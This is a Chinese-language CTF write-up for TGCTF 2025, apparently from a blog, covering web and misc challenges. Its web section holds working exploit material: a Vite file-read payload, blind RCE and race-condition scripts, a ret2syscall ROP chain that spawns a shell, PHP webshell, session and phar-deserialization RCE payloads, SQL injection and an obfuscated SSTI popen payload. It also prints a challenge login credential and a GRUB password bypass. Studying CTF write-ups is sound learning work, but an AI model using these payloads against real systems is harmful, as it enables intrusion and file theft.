参考[https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC](https://blog.meteorkai.top/2025/04/04/Vite开发服务器任意文件读取漏洞分析复现-CVE-2025-31125/#未公开POC)

```
/@fs/tgflagggg?import&?meteorkai.svg?.wasm?init
```

### 火眼辩魑魅

robots.txt 直接打 tgshell.php

无过滤，直接POST传cat /f*一把梭了

### 熟悉的配方，熟悉的味道

狠狠非预期！！！

直接打盲注好吧。

```python
import string
import requests
from tqdm import tqdm
url = "http://node1.tgctf.woooo.tech:30215"
flag = "TGCTF{028b2d11-2783-464c-8cea-fda040"

for i in range(len(flag),50):
    # for s in 'TGCTF{':
    for s in tqdm('-'+'}'+'{'+string.ascii_lowercase+string.digits):
        data = {"expr":f"import os,operator;f=os.popen('cat /f*').read();a=int(operator.eq(f[{i}],'{s}'));1/a"}
        # res = requests.post(url, data=json)
        res = requests.post(url, data=data)
        # print(res.text, s)
        if res.text != "A server error occurred.  Please contact the administrator.":
            flag += s
            print(flag)
            break
    print(i)
```

只要flag逐位是对的上的就会触发1/0进而报错。否则就是1/1正常。布尔盲注打完了。

### 直面天命

/hints发现有路由。爆破。打到/aazz。可以传参。那就arjun扫。发现filename参数。

路径穿越出。

http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag

### TG_wordpress

/robots.txt进去。看到/.tmp/vuln和/.tmp/.bak。.bak发现服务器在52013开了vuln服务（nc可以连）

ret2syscall 直接ROPgadgets可以一把梭。

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
io=process("./gets")
#io=remote()
def debug(script=""):
    gdb.attach(io, gdbscript=script)

p = b"A"*40
p += p64(0x0000000000409f9e) # pop rsi ; ret
p += p64(0x00000000004c50e0) # @ .data
p += p64(0x0000000000419484) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000409f9e) # pop rsi ; ret
p += p64(0x00000000004c50e8) # @ .data + 8
p += p64(0x000000000043d350) # xor rax, rax ; ret
p += p64(0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401f2f) # pop rdi ; ret
p += p64(0x00000000004c50e0) # @ .data
p += p64(0x0000000000409f9e) # pop rsi ; ret
p += p64(0x00000000004c50e8) # @ .data + 8
p += p64(0x000000000047f2eb) # pop rdx ; pop rbx ; ret
p += p64(0x00000000004c50e8) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x000000000043d350) # xor rax, rax ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000471350) # add rax, 1 ; ret
p += p64(0x0000000000401ce4) # syscall
io.sendline(p)
io.interactive()
```

打到账密。TG_wordpressor, aXx^oV@K&cFoVatzQ*

进去之后发现filemanager 6.0。直接一眼顶针了。CVE-2020-25213。

配置文件有过滤。可以使用如下绕过：

```php
<?= call_user_func('sys'.'tem', 'cat /f*'); ?>
```

打进去就有了。

### AAA偷渡阴平（复仇）

没有禁止session相关。

payload:

```http
GET /?tgctf2025=session_id();session_start();system(hex2bin(session_id())); HTTP/1.1
Host: node2.tgctf.woooo.tech:32385
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cookie: PHPSESSID=636174202f662a
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### 什么文件上传？（复仇）

file_exists可以出发phar。易得：

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class yesterday {
    public $learn;
    public $study="study";
    public $try;
    public function __construct()
    {
        $this->learn = "learn<br>";
    }
    public function __destruct()
    {
        echo "You studied hard yesterday.<br>";
        return $this->study->hard();
    }
}
class today {
    public $doing;
    public $did;
    public $done;
    public function __construct(){
        $this->did = "What you did makes you outstanding.<br>";
    }
    public function __call($arg1, $arg2)
    {
        $this->done = "And what you've done has given you a choice.<br>";
        echo $this->done;
        if(md5(md5($this->doing))==666){
            return $this->doing();
        }
        else{
            return $this->doing->better;
        }
    }
}
class tommoraw {
    public $good;
    public $bad;
    public $soso;
    public function __invoke(){
        $this->good="You'll be good tommoraw!<br>";
        echo $this->good;
    }
    public function __get($arg1){
        $this->bad="You'll be bad tommoraw!<br>";
    }

}
class future{
    private $impossible="How can you get here?<br>";
    private $out;
    private $no;
    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;

    public function __set($arg1, $arg2) {
        if ($this->out->useful7) {
            echo "Seven is my lucky number<br>";
            system('whoami');
        }
    }
    public function __toString(){
        echo "This is your future.<br>";
        system($_POST["wow"]);
        return "win";
    }
    public function __destruct(){
        $this->no = "no";
        return $this->no;
    }
}
$a = new yesterday();
$a -> study = new today();
$a -> study -> doing = new future();

// 后缀必须为phar
$phar = new Phar("evil.phar");
$phar->startBuffering();
// 设置 stubb
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
/**
将自定义的 meta-data 存入 manifest
这个函数需要在php.ini中修改 phar.readonly 为 Off
否则的话会抛出 
creating archive "***.phar" disabled by the php.ini setting phar.readonly 
异常.
*/
$$phar->setMetadata($$a);
// 添加需压缩的文件
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

?>
```

随后上传。在不是复仇那个版本读到uploads.php。发现源码如下：

```php
<?php
if(isset($_FILES['file'])) {
    $uploadDir = 'uploads/';
    if(!file_exists($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    // 白名单允许的扩展名
    $allowedExtensions = ['atg'];
    $fileName = basename($_FILES['file']['name']);
    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    // 检查文件扩展名
    if(!in_array($fileExtension, $allowedExtensions)) {
        die("hacker！");
    }

    $uploadFile = $uploadDir . $fileName;

    if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "文件已保存到：$uploadFile ！";
    } else {
        echo "文件保存出错！";
    }
}
?>
```

允许上传atg文件。

后面易得：

```http
POST /upload.php HTTP/1.1
Host: node1.tgctf.woooo.tech:30759
Content-Length: 940
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://node1.tgctf.woooo.tech:30759
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1OUR0mqZmZ8AtAOc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node1.tgctf.woooo.tech:30759/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary1OUR0mqZmZ8AtAOc
Content-Disposition: form-data; name="file"; filename="evil.atg"
Content-Type: application/octet-stream

GIF89a<?php __HALT_COMPILER(); ?>
此处有不可见字符省略。内容为上述脚本生成的phar
POST /class.php?filename=phar://./uploads/evil.atg/test.txt HTTP/1.1
Host: node1.tgctf.woooo.tech:30759
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 7

wow=env
```

### TGCTF 2025 后台管理

反斜杠转义字符串中的'，然后在password里打SQL注入。

误打误撞试出来flag在flag表里（（（

```http
POST /login HTTP/1.1
Host: 124.71.147.99:9045
Content-Length: 48
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://124.71.147.99:9045
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://124.71.147.99:9045/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=1\&password=union select *,2 from flag#
```

在setcookie头看到flag。TGCTF{ac4ca16f-f1508c-000342}

### 老登，炸鱼来了？

竞争safe变量。

```python
import aiohttp
import asyncio
import time

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.READ_FILE_ENDPOINT = f'{self.baseUrl}'
        self.VALID_CHECK_PARAMETER = '/write?name=123.md&content=flag&format=markdown'
        self.INVALID_CHECK_PARAMETER = '/read?name=../../../../../flag'
        self.RACE_CONDITION_JOBS = 100

    async def setSessionCookie(self, session):
        await session.get(self.baseUrl)

    async def raceValidationCheck(self, session, parameter):
        url = f'{self.READ_FILE_ENDPOINT}{parameter}'
        async with session.get(url) as response:
            return await response.text()

    async def raceCondition(self, session):
        tasks = list()
        for _ in range(self.RACE_CONDITION_JOBS):
            tasks.append(self.raceValidationCheck(session, self.VALID_CHECK_PARAMETER))
            tasks.append(self.raceValidationCheck(session, self.INVALID_CHECK_PARAMETER))
        return await asyncio.gather(*tasks)

    async def solve(self):
        async with aiohttp.ClientSession() as session:
            await asyncio.sleep(1) # wait for the reverse proxy creation

            attempts = 1
            finishedRaceConditionJobs = 0
            while True:
                print(f'[*] Attempts #{attempts} - Finished race condition jobs: {finishedRaceConditionJobs}', end='\r')

                results = await self.raceCondition(session)
                attempts += 1
                finishedRaceConditionJobs += self.RACE_CONDITION_JOBS
                for result in results:
                    print(result)
                    if 'TGCTF{' not in result:
                        continue

                    print(f'\n[+] We won the race window! Flag: {result.strip()}')
                    exit(0)

if name == '__main__':
    baseUrl = 'http://node1.tgctf.woooo.tech:30308' # for local testing
    # baseUrl = 'http://49.13.169.154:8088'
    solver = Solver(baseUrl)

    asyncio.run(solver.solve())
```

### 直面天命（复仇）

直接去非复仇版本里读：

http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py

secret_key = "直面天命"

然后标准SSTI即可。unicode编码绕过。 。 

```bash
直面天命g['\u0070\u006f\u0070']['\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f']['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f']('so'[::-1])['\u0070\u006f\u0070\u0065\u006e']('cat /*')['\u0072\u0065\u0061\u0064']()难违
```



## Misc

### next is the end

手动打开文件夹，得到flag。

![img](/images/1744633170179-41.png)

### where_it_is

百度识图找到另一个视角的正面图。

![img](/images/1744633170179-42.png)

可以模糊看出学校名前两个字**"内湖"**，结合原图的职业二字，在360地图搜索找到对应学校。

![img](/images/1744633170179-43.png)

旁边的站就是港墘站

TGCTF{港墘站}

### 你的运气是好是坏？

CTF自然常数（。

flag{114514}

### TeamGipsy&ctfer

vm运行虚拟机，发现有密码。

在开机时按shift，再按e修改，把ro quiet splash $vt_handoff修改为rw init=/bin/bash，再按F10启动。

然后找到用户名，修改密码为123即可。

![img](/images/1744633170179-44.png)

桌面存在一个mimi.txt记录着之前的指令，发现之前启了两个容器，并且有mysql数据库。

![img](/images/1744633170179-45.png)

重新start之前的docker，并且用文本文件里面的mysql密码连上flag，在其中一个docker的mysql数据库中可以找到flag。

![img](/images/1744633170179-46.png)

![img](/images/1744633170179-47.png)

HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}

### ez_zip

最外层直接爆破出zip密码为20250412，得到一个sh512.txt和End.zip，sh512.txt里面有一句话。

打开End.zip发现里面是End文件夹以及flag.zip和一个sh512.txt，并且sh512.txt原大小为128字节。

所以可知要将sh512.txt内容进行sha512加密，构建一个End.zip，进行明文爆破。

![img](/images/1744633170179-48.png)

将sha512结果存放End/sh512.txt

![img](/images/1744633170179-49.png)

deflate压缩，压缩等级1。

![img](/images/1744633170179-50.png)

使用ARCHPR进行明文攻击解压出flag.zip。

![img](/images/1744633170179-51.png)

没法正常解压，使用010的zip模板进行修复。

将frFileNameLength改为8，压缩方式改成DEFLATE保存，即可解压得到flag。

![img](/images/1744633170179-52.png)

![img](/images/1744633170179-53.png)

TGCTF{Warrior_You_have_defeated_the_giant_dragon!}

### 这是啥o_o

给了一个gif发现后面有疑似二维码的碎片,拼接得到一个汉信码

![img](/images/1744633170179-54.png)

扫描得到提示 time is your fortune ,efficiency is your life

推测和gif的延迟时间有关,修改010的gif模板,打印一下延迟时间得到一组看起来就很像asicc的东西

![img](/images/1744633170179-55.png)

解码得到flag

```Plain
enc=[84,71,67,84,70,123,89,111,117,95,99,97,117,103,104,116,95,117,112,95,119,105,116,104,95,116,105,109,101,33,125]
for i in enc:
    print(chr(i),end='')
```

> TGCTF{You_caught_up_with_time!}

### 你能发现图中的秘密吗?

题目给出一个压缩包和一个png,压缩包有密码

png查看red通道的lsb,发现密钥

![img](/images/1744633170179-56.png)

解压后给了一个png一个pdf

查看pdf的二进制数据发现有ps相关的东西,用ps打开,发现了隐藏的flag图层查看获得第二段flag

![img](/images/1744633170179-57.png)

final_challenge2.png的一个chunk大小异常。

![img](/images/1744633170179-58.png)

提取，补上png文件头文件尾，然后爆破宽高就可以找到正确的宽高图片。

![img](/images/1744633170179-59.png)

flag{you_are_so_attentive_and_conscientous}
